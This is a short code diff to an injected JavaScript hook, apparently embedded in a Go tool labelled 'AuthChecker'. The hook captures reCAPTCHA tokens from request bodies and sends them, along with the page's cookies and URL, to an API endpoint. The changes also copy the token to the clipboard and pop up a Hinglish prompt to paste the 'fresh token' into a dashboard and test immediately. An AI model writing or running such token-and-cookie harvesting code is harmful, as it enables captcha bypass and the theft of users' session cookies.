@@ -156,9 +156,13 @@ func tokenHookScript() string {
       const j=typeof body==='string'?JSON.parse(body):body;
       const t=j&&(j.recaptchaToken||j['g-recaptcha-response']);
       if(!t)return false;
-      fetch(API,{method:'POST',headers:{'Content-Type':'application/json'},
-        body:JSON.stringify({token:t,cookies:document.cookie,url:url||location.href,blocked:!!blocked})});
-      console.log('[AuthChecker] token sent ('+t.length+' chars) blocked='+blocked);
+      try{navigator.clipboard.writeText(t);}catch(e){}
+      try{
+        fetch(API,{method:'POST',headers:{'Content-Type':'application/json'},
+          body:JSON.stringify({token:t,cookies:document.cookie,url:url||location.href,blocked:!!blocked})});
+      }catch(e){}
+      console.log('[AuthChecker] FRESH token ('+t.length+' chars) blocked='+blocked);
+      if(blocked)alert('FRESH token clipboard mein copy! Dashboard par Ctrl+V ya Read Clipboard dabao. Turant Test One!');
       return true;
     }catch(e){return false;}
   }
